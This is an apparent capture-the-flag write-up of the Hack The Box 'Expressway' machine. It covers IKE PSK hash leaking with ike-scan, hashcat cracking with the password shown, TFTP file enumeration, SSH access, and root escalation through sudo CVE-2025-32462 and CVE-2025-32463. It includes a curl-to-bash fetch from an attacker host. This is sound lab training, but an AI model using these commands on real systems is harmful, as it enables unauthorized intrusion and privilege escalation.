---
title: "HTB: Expressway"
# description: ""
date: "2026-03-08 11:33:00 +0800"
categories: [hackthebox,linux]
tags: [udp,isakmp,ike,ike-scan,IPsec,tftp,sudo-1.9.17,cve-2025-32462,cve-2025-32463]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/expressway.png

---
**Expressway is an easy Linux box. Enumerate and exploit the IKE/IPsec service to leak and crack its Pre-Shared Key, then use the recovered credentials to gain SSH access. Escalate to root via CVE-2025-32462.**


---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Scanning</span>
`nmap` finds only one open TCP port(SSH 22):

```console
$ sudo nmap -sC -sV 10.10.11.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 19:59 UTC
Nmap scan report for 10.10.11.87
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```
#### UDP Scanning
```console
$ sudo nmap -sU -v 10.10.11.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 20:06 UTC
Nmap scan report for 10.10.11.87
Host is up (0.023s latency).
Not shown: 995 open|filtered udp ports (no-response)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
```
We can find `ISAKMP` open.

#### Check SNMP 

```console
$ snmpwalk -v2c -c public 10.10.11.87
Timout: No Response from 10.10.11.87
```

### <span style="color:lightgreen">ISAKMP/IKE</span>
`ISAKMP/IKE` is a protocol used to set up a secure, encrypted connection between two devices (like a VPN tunnel).
Think of it like a secret handshake — before two parties can talk privately, they need to:

1. Agree on encryption methods
2. Verify each other's identity (using a Pre-Shared Key or certificate)
3. Exchange keys to encrypt the actual traffic

`IKE` automates this handshake process for `IPsec` VPNs.

#### IKE-Scan
Main Mode:
```console
$ sudo ike-scan 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87   Main Mode Handshake returned HDR=(CKY-R=e87be20a68db8232) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

We can switch Aggressive Mode`(-A)`:

```console
$ sudo ike-scan -A 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87  Aggressive Mode Handshake returned HDR=(CKY-R=47b7c6c3686400a8) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```

Add `-P` to output hash:
```console
$ sudo ike-scan -A -P 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87    Aggressive Mode Handshake returned HDR=(CKY-R=66937bae6c61c21c) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

5f18934ade21c1ea878b43cb5dfbd15a6712c6b7e8059de5c761e96770992ec00cc936c14702418290f0234c59c22db26fb50511dda1f8b109a00312eff1b7a94eac0060a7af81a5ea0f875fa149390bfd656f705f75d5a9caf7b82164473bf6900a372e07157c818a7a61ea80dd55683e7e3e23658e974546c8a1daa7d9742c:4837a17dfc65579b94f1a9541706d23c5d05b7120404ba5661de2525d499ef9e2589cea69e4d5232c9bcecfa6a4d8337773e09e77db5ecb83c06c6f2cc285bb13faf57f0703ac4c0c3be94160eb21ba7c51424a0942959139248fb27194a51226491897e11fe0bc8039005efae6602999b0b32c902bde47cdbb44d224afd05e8:66937bae6c61c21c:56832105b4a63bf2:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:a0f93a12e5983e779063b92ed29237ec3f2676f3:62411bb2501244c6e6e39b44fc811d0834de3d06201a97900e16436c6243cfbe:c4d7d30dc03e5ac1d5f03f015fbf88de1078b4b1

Ending ike-scan 1.9.5: 1 hosts scanned in 0.031 seconds (32.16 hosts/sec).  1 returned handshake; 0 returned notify
```
#### Crack hash
```console
PS C:\hashcat> .\hashcat.exe .\data\hash.txt .\data\rockyou.txt 
hashcat (v7.1.2) starting in autodetect mode
5400 | IKE-PSK SHA1 | Network Protocol
...[snip]...
5f1893......78b4b1:freakingrockstarontheroad
...[snip]...
```

### <span style="color:lightgreen">TFTP</span>
We in UDP Scanning before find `69/udp open|filtered tftp`, go back to `tftp` file enumeration:
```console
$ sudo msfconsole
msf > use auxiliary/scanner/tftp/tftpbrute 
msf auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 10.10.11.87
msf auxiliary(scanner/tftp/tftpbrute) > run

[+] Found ciscortr.cfg on 10.10.11.87
[+] Found cvt01_2_3.bin on 10.10.11.87
[+] Found main-config on 10.10.11.87
[+] Found router.cfg on 10.10.11.87
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

use `tftp` Client, only can get `ciscortr.cfg`:
```console
tftp 10.10.11.87
tftp> get ciscortr.cfg
tftp> get main-config
Error code 1: File not found
tftp> get router.cfg
Error code 1: File not found
tftp> exit
```
Read `ciscortr.cfg`, we can find `username ike password *****` ,and this is the VPN config file.
```console
$ cat ciscortr.cfg

..snip..
enable password *****
!
username ike password *****
ip subnet-zero
ip cef
!
vpdn enable
        vpdn-group 1
        request-dialin
        protocol pppoe
!
ip dhcp excluded-address 10.0.1.1 10.0.1.10
ip dhcp excluded-address 10.0.2.1 10.0.2.10
ip dhcp excluded-address 10.0.3.1 10.0.3.10
!
ip dhcp pool vlan1
   network 10.0.1.0 255.255.255.0
   default-router 10.0.1.1
!
ip dhcp pool vlan2
   network 10.0.2.0 255.255.255.0
   default-router 10.0.2.1
..snip..
```

## <span style="color:lightblue">Shell as ike</span>
We can use crack password to ssh in `ike` and get user flag:
```console
$ ssh ike@10.10.11.87
ike@expressway:~$ cat user.txt
df75d613************************
```
### <span style="color:lightgreen">Enumeration</span>
We just use linpeas.sh:
```console
ike@expressway:~$ curl http://10.10.14.40:8000/linpeas.sh | bash
..snip..
╔══════════╣ Sudo version                                                                                                                                    
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                               
Sudo version 1.9.17
..snip..
```

There are two CVEs cited over and over, CVE-2025-32462 and CVE-2025-32463.
## <span style="color:lightblue">Shell as root</span>
### <span style="color:lightgreen">CVE-2025-32462</span>
Using the `sudo` or `sudoedit` command with the host option to reference an unrelated remote host rule will cause `sudo` to treat that rule as valid for the local system.
`[Vulnerable: sudo 1.9.0 to 1.9.17]`
#### Identify Hosts
We need to guess a hostname that might be defined in the `sudoers` file. Some recursive `grep` around log :
```console
ike@expressway:/var/log$ grep -R expressway . 2>/dev/null
squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```
#### Exploit 
The exploit is quite simple. Just run sudo with the `-h <host>`
```console
ike@expressway:/$ sudo -h offramp.expressway.htb id
uid=0(root) gid=0(root) groups=0(root)
ike@expressway:/$ sudo -h offramp.expressway.htb -i
root@expressway:~# cat root.txt
6b8be400************************
```


### <span style="color:lightgreen">CVE-2025-32463</span>
`sudo` resolves paths via `chroot()` before finishing the security policy check. An attacker who controls the chroot environment can plant a fake `nsswitch.conf`, tricking `sudo` into looking up users/groups from an attacker-controlled source — effectively bypassing authentication and gaining root.
`[Vulnerable: sudo 1.9.14 to 1.9.17]`
#### Exploit 
We can use this [poc](https://github.com/kh4sh3i/CVE-2025-32463), and copy and paste in vim, and woot!:
```console
ike@expressway:/dev/shm$ vi exploit.sh
ike@expressway:/dev/shm$ bash exploit.sh
woot!
root@expressway:/# cat root.txt
6b8be400************************
```
